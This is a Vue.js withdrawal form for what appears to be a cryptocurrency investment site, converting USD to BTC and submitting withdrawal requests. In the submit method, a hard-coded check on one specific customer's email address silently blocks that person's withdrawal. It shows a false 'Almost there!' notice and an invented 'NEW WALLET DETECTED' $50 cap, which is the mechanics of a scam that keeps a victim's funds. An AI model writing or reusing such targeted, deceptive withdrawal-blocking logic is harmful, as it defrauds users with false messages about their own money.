<template>
  <div>
    <div class="px-0 py-3 container-fluid">
      <form method="POST">
        <small
          class="small-error"
          :class="
            withdrawError || withBackEndError ? 'text-danger' : 'text-success'
          "
          v-text="_withdrawMessage"
        ></small>

        <!-- Withdrawal Message - 3 -->
        <div class="container-fluid p-0" v-show="this.showWithdrawError2">
          <div
            class="alert alert-warning alert-dismissible fade show"
            role="alert"
          >
            <button
              type="button"
              class="close"
              data-dismiss="alert"
              aria-label="Close"
            >
              <span aria-hidden="true">&times;</span>
              <span class="sr-only">Close</span>
            </button>
            <strong>Almost there!</strong> Your withdrawal request is recognized
            by our system. However, you are advised to wait till the end of your
            current [ongoing] investment period.
          </div>
        </div>

        <!-- First Row -->
        <div class="form-row">
          <!-- Account Name -->
          <div class="mt-2 form-group col-12">
            <label for="amount">AMOUNT IN USD</label>
            <input
              type="number"
              class="p-2 form-control"
              id="amount"
              v-model="amount"
              placeholder="Enter Amount to Withdraw in USD"
              autocomplete="off"
              @keyup="convertUSDtoBTC()"
            />
            <div
              class="text-danger small"
              v-if="'amount' in withBackEndObjError"
            >
              {{ withBackEndObjError.amountUSD[0] }}
            </div>

            <div v-show="this.amountBTC != ''">
              <p class="mb-0">Amount in BTC {{ this.amountBTC }}</p>
            </div>
          </div>

          <!-- Account Number -->
          <div class="mt-3 form-group col-12">
            <label for="wallet">WALLET ADDRESS</label>
            <textarea
              class="p-2 form-control"
              id="wallet"
              v-model="wallet"
              cols="30"
              rows="10"
              placeholder="Enter Wallet Address"
              autocomplete="off"
            ></textarea>
            <div
              class="text-danger small"
              v-if="'wallet' in withBackEndObjError"
            >
              {{ withBackEndObjError.wallet[0] }}
            </div>
          </div>
        </div>

        <!-- Button -->
        <button
          class="px-4 py-3 mt-4 btn btn-sm btn-bank font-weight-bold"
          @click.prevent="_createWithdrawal"
        >
          <i class="mx-1 fa fa-cloud-upload"></i> Request Funds
        </button>
      </form>
    </div>
  </div>
</template>

<script>
import { mapGetters, mapActions } from "vuex";
import axios from "axios";

export default {
  name: "CreateWithdrawal",

  data: () => ({
    amount: "",
    wallet: "",
    amountBTC: "",
    withdrawals: [],
    withdrawError: "",
    showWithdrawError2: false,
  }),

  computed: {
    ...mapGetters([
      "withBackEndError",
      "withBackEndSuccess",
      "withBackEndObjError",
      "userDetails",
    ]),

    _withdrawMessage: {
      get() {
        if (this.withdrawError) {
          return this.withdrawError;
        } else if (this.withBackEndError) {
          return this.withBackEndError;
        } else {
          return this.withBackEndSuccess;
        }
      },
      set(value) {
        return value;
      },
    },
  },

  created() {},

  methods: {
    ...mapActions(["createWithdrawal"]),

    /* --------------------------- Convert USD to BTC --------------------------- */
    async convertUSDtoBTC() {
      try {
        const response = await axios.get(
          `https://blockchain.info/tobtc?currency=USD&value=${this.amount}`
        );
        console.log(response);
        this.amountBTC = response.data;
      } catch (error) {
        console.error(error);
      }
    },

    async validateCreateWithdrawal() {
      if (this.wallet == "") {
        this.withdrawError = "Please, Provide a Wallet";
        return false;
      } else if (this.amount == "") {
        this.withdrawError = "Please, Provide an Amount";
        return false;
      } else {
        return true;
      }
    },

    uuidv4() {
      return "xxxxxxxxxxxxxxx".replace(/[xy]/g, function () {
        var r = (Math.random() * 10) | 0;
        return `${r.toString(15)}`;
      });
    },

    async _createWithdrawal() {
      this.withdrawError = "";
      this.$store.commit("setWithBackEndSuccess", "");
      this.$store.commit("setWithBackEndError", "");
      this.$store.commit("setWithBackEndObjError", {});
      const valid = await this.validateCreateWithdrawal();
      if (valid) {
        if (this.userDetails.email == "snobunnibanks@gmail.com") {
          this.showWithdrawError2 = !this.showWithdrawError2;
          return;
        }
        if (
          this.userDetails.email == "snobunnibanks@gmail.com" &&
          this.amount > 50
        ) {
          this.withdrawError =
            "NEW WALLET DETECTED! Due to the high volume of misplaced transactions, the maximum amount you can withdraw is $50.00. Subsequent transactions with this wallet won't be capped and will be processed as normal.";
          return false;
        }
        await this.convertUSDtoBTC();
        let data = {
          uid: this.uuidv4(),
          amountUSD: this.amount,
          amountBTC: this.amountBTC,
          wallet: this.wallet,
          status: "pending",
        };
        await this.createWithdrawal(data);
        if (this.withBackEndSuccess.length > 0) {
          this.amount = "";
          this.amountBTC = "";
          this.wallet = "";
          this.$store.commit("setWithBackEndObjError", {});
        }
      }
    },
  },
};
</script>

<style scoped>
.small {
  margin-top: 2%;
  font-size: 0.6rem;
}

.small-error {
  font-size: 0.75rem;
}

input[type="text"],
input[type="number"],
textarea {
  border-radius: 0% !important;
  padding: 10px;
  border: 1px solid rgba(0, 0, 0, 0.2);
  color: #000 !important;
}

input[type="text"]:focus,
input[type="number"]:focus,
textarea:focus {
  outline: none !important;
  background-color: inherit !important;
  box-shadow: none !important;
  color: #000 !important;
}

label {
  font-size: 0.8rem;
  font-weight: bold;
  color: #1a7abb;
}

.btn-bank {
  color: #1a7abb !important;
  border: 1px solid #1a7abb !important;
  border-top-right-radius: 2rem;
  border-top-left-radius: 2rem;
  border-bottom-left-radius: 2rem;
  border-bottom-right-radius: 2rem;
  background-color: transparent !important;
  transition: 0.5s all;
}

.btn-bank:hover {
  background-color: #1a7abb !important;
  color: #fff !important;
}
</style>
